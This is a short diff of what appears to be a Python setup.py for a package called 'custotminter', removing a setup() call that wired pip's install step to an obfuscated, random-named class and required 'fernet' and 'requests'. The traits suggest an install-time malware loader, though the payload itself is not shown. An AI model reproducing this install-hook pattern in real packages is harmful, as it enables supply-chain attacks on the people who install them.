@@ -18,22 +18,5 @@ class dlIcmLFeSjCPYRFpLrbjQNtCvxIKWcFKVSUBDATIjkdpbCjuwwWBtWtKxKdtokLOIlClvdKfrZ
             install.run(self)
 
 
-setup(
-    name="custotminter",
-    version=VERSION,
-    author="rudzIVck",
-    author_email="eZpJhrPiQIXmwV@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': dlIcmLFeSjCPYRFpLrbjQNtCvxIKWcFKVSUBDATIjkdpbCjuwwWBtWtKxKdtokLOIlClvdKfrZZDNqTMZOGnYZAeYqCUiLZIHImyjpzadCvmlNBzQGnhxdeCyCvusnDoTJtwrZMukfzslNkLzZuCkNkDcReoXpNzgAwTbYsvVTaGFJpjBbHPPLhqFnXklqzMdYrBD,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 
